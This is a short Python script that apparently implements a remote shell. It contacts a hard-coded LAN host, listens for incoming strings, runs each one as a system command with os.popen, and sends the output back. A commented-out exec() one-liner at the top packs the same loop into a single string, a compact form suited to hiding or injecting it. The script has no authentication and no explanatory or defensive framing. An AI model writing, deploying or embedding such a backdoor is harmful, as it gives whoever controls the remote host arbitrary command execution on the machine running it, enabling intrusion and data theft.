#exec("""import socket\nimport os\nimport time\nHOST='...'\nME='...'\nPORT=65432\n\nPORT_S=65431\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nprint('Sending first connection')\ns.connect((HOST, PORT_S))\ns.sendall(b'Hello, Im there!\\nNow Receaving...')\ns.close()\nwhile True:\n  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.bind((ME,PORT))\n  s.listen()\n  conn,addr=s.accept()\n  s.close()\n  data=conn.recv(2048)\n  if data.decode() == 'BREAK OUT':\n    break\n  out=os.popen(data.decode()).read()\n  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n  s.connect((HOST, PORT_S))\n  s.sendall(bytes(out, 'UTF-8'))\n  s.close()\n  time.sleep(0.5)""")

import socket
import os
import time

HOST = '192.168.178.21'  # The server's hostname or IP address
ME = '192.168.178.23'
PORT = 65432        # The port used by the server
PORT_S = 65434

s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Sending first connection...")
s.connect((HOST, PORT_S))
s.sendall(b'Hello, Im there!\nNow RECEAVING...')
s.close()

while True:
  # RECEAVE
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((ME, PORT))
  print("Start Listening")
  s.listen()
  conn, addr = s.accept()
  s.close()

  print('Connected by', addr)
  data = conn.recv(1024)
  if(data.decode() == "BREAK OUT"):
    print("Breaking out.")
    break
  out = os.popen(data.decode()).read()
  print(data.decode())

  # SEND 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT_S))
  s.sendall(bytes(out, 'UTF-8'))
  s.close()